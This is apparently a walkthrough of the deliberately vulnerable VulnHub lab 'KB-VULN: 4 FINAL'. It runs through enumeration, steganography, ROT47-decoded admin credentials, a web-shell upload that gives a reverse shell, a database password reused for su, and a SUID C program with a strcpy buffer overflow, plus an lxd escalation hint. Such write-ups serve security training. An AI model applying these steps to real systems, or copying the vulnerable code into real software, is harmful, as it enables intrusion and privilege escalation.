<img width="394" height="44" alt="image" src="https://github.com/user-attachments/assets/e3eaf257-ec8e-4fea-8952-4472aa20f12d" /># KB-VULN: 4 FINAL Walkthrough

# Description
```bash
This machine is the kind that will measure your level in both research and exploit development. It includes 2 flags:user.txt and root.txt.

This works better with VirtualBox rather than VMware
```

# Exploitation
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.124/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 8 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 480                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     f0:a7:31:e9:bb:f8      2     120  TP-Link Systems Inc                                                                                                                                            
 192.168.0.108   08:00:27:42:3d:c3      2     120  PCS Systemtechnik GmbH                                                                                                                                         
 192.168.0.103   58:11:22:85:0d:41      4     240  ASUSTek COMPUTER INC.
```
\
Next, checking for open ports on the target machine
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
\
Let's open burpsuite and check what's on port 80
\
<img width="1420" height="789" alt="image" src="https://github.com/user-attachments/assets/ac57911b-662c-4a85-95f0-e1086aa21b95" />
\
WE get a message that we are hacked on the home page , nothing useful here , so i run dirb scan for enumeration
```bash
dirb http://192.168.0.108/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr 18 02:04:43 2026
URL_BASE: http://192.168.0.108/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.108/ ----
+ http://192.168.0.108/.git/HEAD (CODE:200|SIZE:20)                                                                                                                                                             
==> DIRECTORY: http://192.168.0.108/files/                                                                                                                                                                      
==> DIRECTORY: http://192.168.0.108/images/                                                                                                                                                                     
==> DIRECTORY: http://192.168.0.108/rpc/                                                                                                                                                                        
+ http://192.168.0.108/server-status (CODE:403|SIZE:278)                                                                                                                                                        
==> DIRECTORY: http://192.168.0.108/sites/                                                                                                                                                                      
==> DIRECTORY: http://192.168.0.108/textpattern/                                                                                                                                                                
==> DIRECTORY: http://192.168.0.108/themes/
```
\
Got many folders , so checking them one by one
\
<img width="485" height="330" alt="image" src="https://github.com/user-attachments/assets/2a997541-8470-4418-87e6-86e548eda55a" />
\
<img width="659" height="557" alt="image" src="https://github.com/user-attachments/assets/7855d092-c16a-467d-bb85-fe9d79216712" />
\
<img width="1115" height="540" alt="image" src="https://github.com/user-attachments/assets/ba52d23c-5f7f-4c5a-a892-c26e828b77c3" />
\
Then i found that there is a textpattern cms running and found some random setup page to try to find version number
\
<img width="1338" height="732" alt="image" src="https://github.com/user-attachments/assets/afe5a8a5-03d3-4c48-8fda-c21d13aa617c" />
\
And i also checked if there are any known vulns using searchsploit
```bash
searchsploit textpattern 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
TextPattern 1.19 - 'publish.php' Remote File Inclusion                                                                                                                           | php/webapps/2646.txt
TextPattern 4.2 - 'index.php' Cross-Site Scripting                                                                                                                               | php/webapps/35571.txt
TextPattern 4.4.1 - 'ddb' Cross-Site Scripting                                                                                                                                   | php/webapps/36489.txt
TextPattern 4.6.2 - 'qty' SQL Injection                                                                                                                                          | php/webapps/44277.txt
Textpattern 4.8.3 - Remote code execution (Authenticated) (2)                                                                                                                    | php/webapps/49620.py
Textpattern 4.8.8 - Remote Code Execution (RCE) (Authenticated)                                                                                                                  | php/webapps/51176.txt
textpattern CMS 4.2.0 - Remote File Inclusion                                                                                                                                    | php/webapps/14823.txt
Textpattern CMS 4.6.2 - 'body' Persistent Cross-Site Scripting                                                                                                                   | php/webapps/48861.txt
Textpattern CMS 4.6.2 - Cross-site Request Forgery                                                                                                                               | php/webapps/48907.txt
TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)                                                                                                                    | php/webapps/48943.py
Textpattern CMS 4.8.4 - 'Comments' Persistent Cross-Site Scripting (XSS)                                                                                                         | php/webapps/49616.txt
TextPattern CMS 4.8.7 - Remote Command Execution (Authenticated)                                                                                                                 | php/webapps/49996.txt
TextPattern CMS 4.8.7 - Remote Command Execution (RCE) (Authenticated)                                                                                                           | php/webapps/50415.txt
TextPattern CMS 4.8.7 - Stored Cross-Site Scripting (XSS)                                                                                                                        | php/webapps/49975.txt
Textpattern CMS 4.9.0-dev - 'Excerpt' Persistent Cross-Site Scripting (XSS)                                                                                                      | php/webapps/49617.txt
TextPattern CMS 4.9.0-dev - Remote Command Execution (RCE) (Authenticated)                                                                                                       | php/webapps/50095.py
Textpattern CMS v4.8.8 - Stored Cross-Site Scripting (XSS) (Authenticated)                                                                                                       | php/webapps/51523.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
\
Since the highest upgraded script in that setup was 4.8.4 , the cms version should be minimun of 4.8.4
\
From the textpattern login page , we can also see that the website domain is kb.final , so we add that in our /etc/hosts file
\
Then i ran dirsearch and found many other files
\
<img width="892" height="631" alt="image" src="https://github.com/user-attachments/assets/7d9eaf81-93b9-4d38-b4d7-bba28364e484" />
\
<img width="498" height="326" alt="image" src="https://github.com/user-attachments/assets/8f7d5578-2ffa-4743-ae0d-9c8e77c57776" />
\
<img width="511" height="557" alt="image" src="https://github.com/user-attachments/assets/83b92453-d792-4efe-9060-27594ef08d9f" />
\
<img width="782" height="751" alt="image" src="https://github.com/user-attachments/assets/f19c0715-986e-4c8c-af38-f8e1b1bf1b82" />
\
<img width="904" height="796" alt="image" src="https://github.com/user-attachments/assets/19a0d2fc-c6f9-45f0-bdf5-9569febe165d" />
\
I was stuck at this point , but then used a hint and looked up 
\
Since the home page said "SEarchme" by  "Macihneboy141" , we search online
\
We see his github with a repo kb-dump
\
<img width="1485" height="731" alt="image" src="https://github.com/user-attachments/assets/7f1119ad-4bde-4771-9c20-802d7c319fbb" />
\
<img width="1577" height="760" alt="image" src="https://github.com/user-attachments/assets/e5cb735a-da78-467e-ab4e-2c211d237a6c" />
\
So we download the zip file , extract it and use steghide on it to get some secret data
```bash
C:\home\kali\cysec\vulnhub\kb-vuln> ls -la 
total 856
drwxrwxr-x  5 kali kali   4096 Apr 18 02:58 .
drwxrwxr-x 82 kali kali   4096 Apr 18 02:00 ..
-rw-r--r--  1 kali kali   3310 Jan 24  2021 deniz.jpg
-rw-r--r--  1 kali kali  92479 Nov  2  2020 elif.jpg
-rw-r--r--  1 kali kali 100585 Jan 24  2021 emre.jpg
drwxrwxr-x  3 kali kali   4096 Apr 18 02:14 .git
-rw-rw-r--  1 kali kali 411460 Apr 18 02:58 KB-DUMP.zip
-rw-r--r--  1 kali kali  71635 Nov  2  2020 mehmet.jpg
drwxrwxr-x  3 kali kali   4096 Apr 18 02:22 new
-rw-r--r--  1 kali kali  23056 Nov  2  2020 omer.jpg
drwxrwxr-x  3 kali kali   4096 Apr 18 02:37 reports
-rw-r--r--  1 kali kali  98784 Nov  2  2020 serpil.jpg
-rw-r--r--  1 kali kali  37036 Jan 24  2021 yunus.jpg
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> steghide --extract -sf deniz.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> steghide --extract -sf elif.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> steghide --extract -sf emre.jpg 
Enter passphrase: 
wrote extracted data to "steganopayload1125546.txt".
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> steghide --extract -sf mehmet.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> steghide --extract -sf omer.jpg  
Enter passphrase: 
wrote extracted data to "steganopayload202720.txt".
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> steghide --extract -sf serpil.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> steghide --extract -sf yunus.jpg  
Enter passphrase: 
wrote extracted data to "steganopayload1125574.txt".
```
\
Now we get these hints
```bash
C:\home\kali\cysec\vulnhub\kb-vuln> cat steganopayload*
25>:?6K3:C4:>6a_a_http://kb.final/textpattern/                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> cat steganopayload1125546.txt 
6K3:C4:>6a_a_                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> cat steganopayload1125574.txt 
http://kb.final/textpattern/                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\kb-vuln> cat steganopayload202720.txt 
25>:?                                                                                                                                                                                                                   
```
\
So the author is telling to use these at the hinted endpoint
\
<img width="1157" height="574" alt="image" src="https://github.com/user-attachments/assets/04bda037-7a47-45a4-a0f6-bc6605cddd8e" />
\
So i put the encodded data to indentify which kind of cipher it is and try one by one 
\
Here i see that the rot47 cipher makes sense
\
<img width="1151" height="539" alt="image" src="https://github.com/user-attachments/assets/36dda6e8-1cd2-421b-9394-783d263f84dc" />
\
<img width="1155" height="516" alt="image" src="https://github.com/user-attachments/assets/f3880fd1-911a-4d95-9442-5c1831161210" />
\
So we basically have credentials to login with
\
WE have to change the last digit of the password to "1" only then it works
\
<img width="1683" height="733" alt="image" src="https://github.com/user-attachments/assets/fded51a0-0fbc-4b14-9c5a-4a9168892e41" />
\
So i go under content and files and there is a file upload option , so i try that
\
<img width="1110" height="598" alt="image" src="https://github.com/user-attachments/assets/b70ae3cf-6651-4cae-a9be-6d18e07fe3aa" />
\
Now file is uploaded
\
<img width="1715" height="452" alt="image" src="https://github.com/user-attachments/assets/a5ba4a9c-0780-493d-b9b1-fd94b7a89cae" />
\
So we can access it at this location and get our reverse shell
\
<img width="394" height="44" alt="image" src="https://github.com/user-attachments/assets/a4295857-5115-4f3e-86f2-4b770dd007c2" />
\
We have a shell as www-data 
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from kb-server~192.168.0.108-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/kb-server~192.168.0.108-Linux-x86_64/2026_04_18-03_13_47-353.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@kb-server:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@kb-server:/$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
machineboy:x:1000:1000:FINAL-MACHINE:/home/machineboy:/bin/bash
```
\
So i was looking around and found the config file for textpattern
```bash
www-data@kb-server:/var/www/html/textpattern/textpattern$ cat config.php 
<?php
$txpcfg['db'] = 'textpattern';
$txpcfg['user'] = 'textuser';
$txpcfg['pass'] = 'ghostroot510';
$txpcfg['host'] = 'localhost';
$txpcfg['table_prefix'] = '';
$txpcfg['txpath'] = '/var/www/html/textpattern/textpattern';
$txpcfg['dbcharset'] = 'utf8mb4';
// For more customization options, please consult config-dist.php file.

```
\
Thhe password is usually the same as the user in the machine , so i try it for the user machineboy and successfukky switch to the user
```bash
www-data@kb-server:/var/www/html/textpattern/textpattern$ su machineboy
Password: 
machineboy@kb-server:/var/www/html/textpattern/textpattern$ id
uid=1000(machineboy) gid=1000(machineboy) groups=1000(machineboy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
\
Next , we go to home dir to check for stuff
```bash
machineboy@kb-server:~$ ls -la
total 64
drwxr-xr-x 7 machineboy machineboy 4096 Jan 24  2021 .
drwxr-xr-x 3 root       root       4096 Jan 24  2021 ..
-rw------- 1 machineboy machineboy    0 Jan 24  2021 .bash_history
-rw-r--r-- 1 machineboy machineboy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 machineboy machineboy 3771 Apr  4  2018 .bashrc
drwx------ 2 machineboy machineboy 4096 Jan 24  2021 .cache
-rw-rw-r-- 1 machineboy machineboy   22 Jan 24  2021 .gdbinit
drwx------ 3 machineboy machineboy 4096 Jan 24  2021 .gnupg
-rwsr-sr-x 1 root       root       9912 Jan 24  2021 install
-rw-r--r-- 1 root       root        402 Jan 24  2021 install.c
drwxrwxr-x 3 machineboy machineboy 4096 Jan 24  2021 .local
drwxrwxr-x 4 machineboy machineboy 4096 Jan 24  2021 peda
-rw-r--r-- 1 machineboy machineboy  807 Apr  4  2018 .profile
drwx------ 2 machineboy machineboy 4096 Jan 24  2021 .ssh
-rw-r--r-- 1 machineboy machineboy    0 Jan 24  2021 .sudo_as_admin_successful
-rw------- 1 machineboy machineboy   33 Jan 24  2021 user.txt
machineboy@kb-server:~$ cat user.txt 
1b5cec2e69c4d72571ac4fd9e618bd2a
machineboy@kb-server:~$ cat install.c
#include <stdio.h>
#include <stdlib.h>
void spawn_shell()
{
     setuid(0);
     system("/bin/bash");
}

int main()
{
      char buff[30];
      const char *env = getenv("INSTALLED");
      if(env != NULL)
      {
        strcpy(buff,env);
        printf("%s\n",buff);
      }

      else
      {
         system("sudo apt install sl");
         system("export INSTALLED=OK");
      }
     return 0;
}
```
\
It looks like we have to handle with a buffer overflow case here , we have to trigger the function spawn_shell
\
We can become root using this method or using lxc also, since our user has lxd permissions
\
WE can just follow the steps from "https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html"
\
The end , thank you for reading till here
